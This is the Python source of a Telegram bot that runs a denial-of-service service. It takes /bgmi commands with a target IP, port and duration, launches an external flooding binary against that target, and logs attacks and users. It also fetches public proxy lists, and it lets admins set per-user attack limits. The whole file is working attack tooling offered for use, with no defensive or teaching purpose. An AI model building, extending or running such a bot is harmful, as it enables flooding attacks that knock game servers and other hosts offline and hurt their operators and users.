import logging
import subprocess
import asyncio
import itertools
import requests
import os
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, GROUP_ID, GROUP_LINK, DEFAULT_THREADS

# Proxy-related functions
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'
proxy_iterator = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        logging.error(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
        if proxy_iterator is None:  # If proxies are not available
            return None
    return next(proxy_iterator, None)

# Global variables
user_processes = {}
active_attack = False  # Track if an attack is in progress
MAX_DURATION = 240  # Default max attack duration in seconds
user_durations = {}  # Dictionary to store max durations for specific users

# File paths
USERS_FILE = "users.txt"
LOGS_FILE = "logs.txt"

# Ensure commands are executed in the correct group
async def ensure_correct_group(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if update.effective_chat.id != GROUP_ID:
        await update.message.reply_text(f"❌ This bot can only be used in a specific group. Join here: {GROUP_LINK}")
        return False
    return True

# Read users from file
def read_users():
    try:
        if not os.path.exists(USERS_FILE):
            return []
        with open(USERS_FILE, "r") as f:
            users = []
            for line in f:
                parts = line.strip().split(",")
                if len(parts) == 2:
                    users.append(parts)
            return users
    except Exception as e:
        logging.error(f"Error reading users file: {str(e)}")
        return []

# Save user information
async def save_user_info(user_id, username):
    try:
        existing_users = {}
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r") as f:
                for line in f:
                    parts = line.strip().split(",")
                    if len(parts) == 2:
                        uid, uname = parts
                        existing_users[uid] = uname

        if str(user_id) not in existing_users:
            with open(USERS_FILE, "a") as f:
                f.write(f"{user_id},{username}\n")
    except Exception as e:
        logging.error(f"Error saving user info: {str(e)}")

# Save attack logs
async def save_attack_log(user_id, target_ip, port, duration):
    try:
        with open(LOGS_FILE, "a") as f:
            f.write(f"User: {user_id}, Target: {target_ip}:{port}, Duration: {duration}s\n")
    except Exception as e:
        logging.error(f"Error saving attack log: {str(e)}")

async def start_attack(target_ip, port, duration, user_id, original_message, context):
    global active_attack
    command = ['./xxxx', target_ip, str(port), str(duration)]

    try:
        process = await asyncio.create_subprocess_exec(*command)
        if not process:
            return  # Silently exit if subprocess creation fails

        user_processes[user_id] = {
            "process": process,
            "target_ip": target_ip,
            "port": port,
            "duration": duration
        }

        await asyncio.wait_for(process.wait(), timeout=duration)

        del user_processes[user_id]
        active_attack = False  # Reset the flag after the attack finishes

        try:
            await original_message.reply_text(f"✅ Attack finished on {target_ip}:{port} for {duration} seconds.")
        except Exception:
            pass  # Silently ignore all errors when sending the reply

    except asyncio.TimeoutError:
        if process and process.returncode is None:
            process.terminate()
            await process.wait()
        if user_id in user_processes:
            del user_processes[user_id]
        active_attack = False
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text="⚠️ Attack terminated as it exceeded the duration."
            )
        except Exception:
            pass

    except Exception:
        if user_id in user_processes:
            del user_processes[user_id]
        active_attack = False

# Start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return
    await update.message.reply_text("👋 Welcome to the Attack Bot!\nUse /bgmi <IP> <PORT> <DURATION> to start an attack.")

# BGMI command handler
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global active_attack
    if not await ensure_correct_group(update, context):
        return

    user = update.message.from_user
    user_id = user.id
    username = user.username or "Unknown"

    await save_user_info(user_id, username)

    if active_attack:
        await update.message.reply_text("🚫 An attack is already in progress. Please wait for the current attack to finish before starting a new one.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("🛡️ Usage: /bgmi <target_ip> <port> <duration>")
        return

    target_ip = context.args[0]
    try:
        port = int(context.args[1])
        duration = int(context.args[2])
    except ValueError:
        await update.message.reply_text("⚠️ Port and duration must be integers.")
        return

    max_duration = user_durations.get(user_id, MAX_DURATION)
    if duration > max_duration:
        await update.message.reply_text(f"⚠️ Your max attack duration is {max_duration} seconds as set by the admin.")
        duration = max_duration

    await save_attack_log(user_id, target_ip, port, duration)

    attack_message = await update.message.reply_text(f"🚀 Attack started on {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.")

    active_attack = True
    asyncio.create_task(start_attack(target_ip, port, duration, user_id, attack_message, context))

# Set max duration command (Admin-only)
async def set_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("🛡️ Usage: /set <uid/username> <duration>")
        return

    try:
        target = context.args[0]
        duration = int(context.args[1])

        if target.isdigit():
            user_durations[int(target)] = duration
        else:
            user_found = False
            for uid, uname in read_users():
                if uname == target:
                    user_durations[int(uid)] = duration
                    user_found = True
                    break
            if not user_found:
                await update.message.reply_text("⚠️ User not found.")
                return

        await update.message.reply_text(f"✅ Max attack duration set to {duration} seconds for {target}.")
    except ValueError:
        await update.message.reply_text("⚠️ Duration must be an integer.")

# View logs command (Admin-only)
async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return

    try:
        with open(LOGS_FILE, "r") as f:
            logs = f.read()
        await update.message.reply_text(f"📊 Attack logs:\n{logs}")
    except Exception as e:
        await update.message.reply_text("⚠️ No logs available.")

# View users command (Admin-only)
async def users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return

    try:
        with open(USERS_FILE, "r") as f:
            users = f.read()
        await update.message.reply_text(f"👥 Users:\n{users}")
    except Exception as e:
        await update.message.reply_text("⚠️ No users available.")

# Main application setup
if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("set", set_duration))
    app.add_handler(CommandHandler("logs", logs))
    app.add_handler(CommandHandler("users", users))
    app.run_polling()
